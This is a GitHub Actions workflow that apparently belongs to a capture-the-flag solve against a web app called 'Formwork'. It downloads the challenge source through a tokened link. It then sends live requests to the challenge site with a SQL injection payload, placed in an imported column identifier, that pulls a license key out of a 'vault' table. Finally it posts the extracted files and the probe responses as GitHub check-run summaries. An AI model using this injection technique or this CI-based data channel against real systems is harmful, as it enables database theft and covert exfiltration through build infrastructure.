name: Retrieve Formwork source

on:
  push:
    branches: ["arena/01a0e21b-ctf"]

permissions:
  checks: write

jobs:
  download:
    runs-on: ubuntu-latest
    steps:
      - name: Download attached source archive
        run: |
          curl --fail --location --retry 3 --retry-delay 3 \
            'https://ctf.h7tex.com/api/v1/challenges/formwork/attachments/5ee7f1e3-16bd-4e41-9bcf-3c976f042ea1/download?t=1790542917.c7e2aa8ed73ff8f150f8d0929568da243a5131bcf3ad409989701bb0e5f578cb' \
            --output formwork-source.bin
          mkdir extracted
          if unzip -q formwork-source.bin -d extracted; then :; else tar -xf formwork-source.bin -C extracted; fi
      - name: Probe the live Formwork interface
        run: |
          set -euo pipefail
          site='https://web-379f4d432edec08d.web.h7tex.com'
          : > extracted/probe.txt
          while IFS= read -r col; do
            headers=$(mktemp)
            curl --fail --silent --show-error -D "$headers" -o /dev/null \
              -X POST --data-urlencode "name=probe-$GITHUB_RUN_ID" "$site/bases"
            id=$(sed -nE 's#^[Ll]ocation: /bases/([0-9a-f]+)\r?$#\1#p' "$headers")
            body=$(jq -cn --arg col "$col" '{fields:[{label:"safe",col_ident:"x",position:0},{label:"probe",col_ident:$col,position:1}]}')
            import=$(curl --silent --show-error --include -X POST -H 'Content-Type: application/json' --data "$body" "$site/api/bases/$id/import")
            record=$(curl --silent --show-error --include -X POST --data-urlencode 'x=hello' "$site/bases/$id/records")
            seal=$(curl --silent --show-error --include -X POST "$site/bases/$id/seal")
            {
              printf '\n== Base %s ==\nPayload: %s\n== import ==\n%s\n== record ==\n%s\n== seal ==\n%s\n' "$id" "$col" "$import" "$record" "$seal"
            } >> extracted/probe.txt
          done <<'PAYLOADS'
          x'||(SELECT license_key::int FROM vault WHERE team=$$workspace$$)||'
          PAYLOADS
      - name: Publish source to check output
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          while IFS= read -r -d '' source; do
            relative="${source#extracted/}"
            summary_file="$(mktemp)"
            {
              printf '## `%s`\n\n' "$relative"
              printf '```text\n'
              cat "$source"
              printf '\n```\n'
            } > "$summary_file"
            jq -n \
              --arg name "Formwork source: $relative" \
              --arg sha "$GITHUB_SHA" \
              --rawfile summary "$summary_file" \
              '{name: $name, head_sha: $sha, status: "completed", conclusion: "success", output: {title: $name, summary: $summary}}' \
              | curl --fail --silent --show-error \
                  -X POST "https://api.github.com/repos/$GITHUB_REPOSITORY/check-runs" \
                  -H "Accept: application/vnd.github+json" \
                  -H "Authorization: Bearer $GH_TOKEN" \
                  -H "X-GitHub-Api-Version: 2022-11-28" \
                  -d @- > /dev/null
          done < <(find extracted -type f -print0 | sort -z)
